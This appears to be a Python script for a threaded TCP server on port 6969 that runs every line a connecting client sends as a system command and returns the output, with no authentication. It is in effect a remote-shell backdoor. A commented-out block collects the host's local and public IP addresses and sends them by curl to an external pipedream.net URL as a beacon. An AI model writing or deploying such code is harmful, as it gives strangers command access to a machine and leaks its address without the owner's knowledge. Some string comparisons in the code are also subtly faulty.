
# function for handling command
def handleCommand(string):
    res = subprocess.check_output(string.split())
    return res

#Function for handling connections. This will be used to create threads
def clientthread(conn):
    #Sending message to connected client
    conn.send(b'Welcome to the server. Type something and hit enter\n') #send only takes string

    stringbuilder = ""
    stringBuilt = False

    #infinite loop so that function do not terminate and thread do not end.
    while True:

        #Receiving from client
        data = conn.recv(1024)
        # reply = 'OK, sending: ' + str(data, 'utf-8')
        datastr = str(data, 'utf-8')
        if datastr[-1:] is not "\n":
            if stringBuilt is True:
                stringbuilder = ""
            stringBuilt = False
        stringbuilder += datastr
        if datastr[-1:] is "\n":
            stringBuilt = True

        if stringBuilt is True:
            res = handleCommand(stringbuilder)
            print(str(res, 'utf-8'))
            conn.sendall(bytes('OK, sending: ' + stringbuilder, 'utf-8'))
            conn.sendall(bytes('Returned: ' + str(res, 'utf-8'), 'utf-8'))

        if not data:
            break

        # conn.sendall(bytes(reply, 'utf-8'))

        # print(str(data, 'utf-8').split(' '))
        # print(str(data, 'utf-8'))
        #
        # res = subprocess.check_output(str(data, 'utf-8').split())
        # conn.sendall(bytes(res, 'utf-8'));

    #came out of loop
    conn.close()

import subprocess
# ip = str(handleCommand("ipconfig getifaddr en0"), 'utf-8')
# print(ip)
# pubip = str(handleCommand("curl ifconfig.co"), 'utf-8')
# print(pubip)
# handleCommand("curl https://enir9zpsoeuo.x.pipedream.net//?localip="+ip[0:-1]+"&publicip="+pubip[0:-1])

'''
	Simple socket server using threads
'''

import socket
import sys
from threading import *

HOST = ''	# Symbolic name meaning all available interfaces
PORT = 6969	# Arbitrary non-privileged port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Socket created')

#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
    sys.exit()

print('Socket bind complete')

#Start listening on socket
s.listen(10)
print('Socket now listening')


#now keep talking with the client
while 1:
    #wait to accept a connection - blocking call
    conn, addr = s.accept()
    print('Connected with ' + addr[0] + ':' + str(addr[1]))

    #start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
    thread = Thread(target=clientthread ,args=(conn,))
    thread.start()
    thread.join()
s.close()